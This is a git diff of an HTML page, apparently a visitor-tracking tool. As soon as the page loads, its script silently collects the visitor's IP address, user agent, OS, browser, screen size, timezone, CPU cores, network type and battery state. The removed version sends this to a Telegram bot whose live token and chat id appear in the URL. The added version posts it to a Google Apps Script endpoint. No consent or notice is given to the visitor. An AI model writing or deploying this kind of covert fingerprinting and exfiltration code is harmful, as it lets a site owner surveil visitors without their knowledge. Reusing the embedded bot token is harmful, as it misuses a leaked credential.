@@ -1,105 +1,72 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>User Tracking</title>
-    <script>
-        function trackUser() {
-            let ip_api = "https://api64.ipify.org?format=json";
-
-            fetch(ip_api)
-                .then(response => response.json())
-                .then(data => {
-                    let userIP = data.ip;
-                    let userAgent = navigator.userAgent; // Browser details
-                    let screenSize = `${screen.width}x${screen.height}`; // Screen Resolution
-                    let referrer = document.referrer || "Direct Visit"; // Referrer URL
-                    let timezone = Intl.DateTimeFormat().resolvedOptions().timeZone; // Timezone
-
-                    // **Improved OS and Browser Detection**
-                    let osName = "Unknown OS";
-                    let osVersion = "Unknown Version";
-                    let userAgentInfo = navigator.userAgent;
-
-                    // Detect OS and version
-                    if (/Android (\d+\.\d+)/.test(userAgentInfo)) {
-                        osName = "Android";
-                        osVersion = userAgentInfo.match(/Android (\d+\.\d+)/)[1];
-                    } else if (/Windows NT (\d+\.\d+)/.test(userAgentInfo)) {
-                        osName = "Windows";
-                        osVersion = userAgentInfo.match(/Windows NT (\d+\.\d+)/)[1];
-                    } else if (/Mac OS X (\d+\.\d+)/.test(userAgentInfo)) {
-                        osName = "Mac OS";
-                        osVersion = userAgentInfo.match(/Mac OS X (\d+\.\d+)/)[1];
-                    } else if (/Linux/.test(userAgentInfo)) {
-                        osName = "Linux";
-                    }
-
-                    // Using navigator.userAgentData for more accurate OS and Browser detection
-                    if (navigator.userAgentData) {
-                        const deviceData = navigator.userAgentData;
-                        osName = deviceData.platform;
-                        osVersion = deviceData.uaFullVersion;
-                    }
-
-                    let browserName = "Unknown Browser";
-                    let browserVersion = "Unknown Version";
-                    
-                    // Detect browser
-                    if (/Chrome/.test(userAgentInfo)) {
-                        browserName = "Chrome";
-                        browserVersion = userAgentInfo.match(/Chrome\/(\d+\.\d+)/)[1];
-                    } else if (/Firefox/.test(userAgentInfo)) {
-                        browserName = "Firefox";
-                        browserVersion = userAgentInfo.match(/Firefox\/(\d+\.\d+)/)[1];
-                    } else if (/Safari/.test(userAgentInfo)) {
-                        browserName = "Safari";
-                        browserVersion = userAgentInfo.match(/Version\/(\d+\.\d+)/)[1];
-                    } else if (/Edge/.test(userAgentInfo)) {
-                        browserName = "Edge";
-                        browserVersion = userAgentInfo.match(/Edge\/(\d+\.\d+)/)[1];
-                    }
-
-                    // **Extra Info**
-                    let deviceName = navigator.platform; // OS Platform
-                    let cpuCores = navigator.hardwareConcurrency || "Unknown";
-                    let touchSupport = navigator.maxTouchPoints > 0 ? "Yes" : "No";
-                    let networkType = navigator.connection ? navigator.connection.effectiveType : "Unknown";
-
-                    // **Battery Info (Async)**
-                    navigator.getBattery().then(function(battery) {
-                        let batteryLevel = (battery.level * 100) + "%";
-                        let chargingStatus = battery.charging ? "Charging" : "Not Charging";
-
-                        // Construct message for Telegram
-                        let message = `New Visitor Detected! 
-                        \nIP: ${userIP} 
-                        \nUser-Agent: ${userAgent} 
-                        \nDevice: ${deviceName} 
-                        \nOS: ${osName} ${osVersion} 
-                        \nBrowser: ${browserName} ${browserVersion} 
-                        \nScreen: ${screenSize} 
-                        \nReferrer: ${referrer} 
-                        \nTimezone: ${timezone} 
-                        \nCPU Cores: ${cpuCores} 
-                        \nTouch Support: ${touchSupport} 
-                        \nNetwork Type: ${networkType} 
-                        \nBattery: ${batteryLevel} (${chargingStatus})`;
-
-                        let tg_url = `https://api.telegram.org/bot7541518107:AAHKDYJ7w_KMe2In8ozJjtLET8IuW9jKtyY/sendMessage?chat_id=8094522569&text=${encodeURIComponent(message)}`;
-                        fetch(tg_url)
-                            .then(response => response.json())
-                            .then(data => console.log("Data sent to Telegram:", data))
-                            .catch(error => console.error("Error sending data to Telegram:", error));
-                    });
-                });
-        }
-
-        window.onload = trackUser;
-    </script>
+  <title>Visitor Logger</title>
 </head>
 <body>
-    <h2>Tracking User Information...</h2>
+  <h1>Logging visitor info...</h1>
+
+  <script>
+    // 👇 Apna Web App URL yahan paste karo
+    const WEB_APP_URL = "https://script.google.com/macros/s/AKfycbx5gAzNqaV1inCTO67XybUxZEsut_KHGsKBrMN77cBzezDANyEUZSX33An9Qles7bLW/exec";
+
+    async function getVisitorIP() {
+      try {
+        const res = await fetch('https://api.ipify.org?format=json');
+        const data = await res.json();
+        return data.ip;
+      } catch {
+        return "Unknown";
+      }
+    }
+
+    async function getBatteryInfo() {
+      try {
+        const battery = await navigator.getBattery();
+        return {
+          level: Math.round(battery.level * 100) + "%",
+          charging: battery.charging ? "Charging" : "Not Charging"
+        };
+      } catch {
+        return {
+          level: "Unknown",
+          charging: "Unknown"
+        };
+      }
+    }
+
+    async function logVisitor() {
+      const ip = await getVisitorIP();
+      const battery = await getBatteryInfo();
+
+      const data = {
+        ip: ip,
+        userAgent: navigator.userAgent,
+        deviceName: navigator.platform || "Unknown",
+        osName: navigator.userAgent.includes("Android") ? "Android" : "Other",
+        osVersion: "Unknown",
+        browserName: navigator.userAgent.includes("Chrome") ? "Chrome" : "Other",
+        browserVersion: "Unknown",
+        screenSize: screen.width + "x" + screen.height,
+        referrer: document.referrer || "Direct",
+        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+        cpuCores: navigator.hardwareConcurrency || "Unknown",
+        touchSupport: navigator.maxTouchPoints > 0 ? "Yes" : "No",
+        networkType: navigator.connection ? navigator.connection.effectiveType : "Unknown",
+        batteryLevel: battery.level,
+        chargingStatus: battery.charging
+      };
+
+      fetch(WEB_APP_URL, {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json"
+        },
+        body: JSON.stringify(data)
+      });
+    }
+
+    logVisitor();
+  </script>
 </body>
 </html>
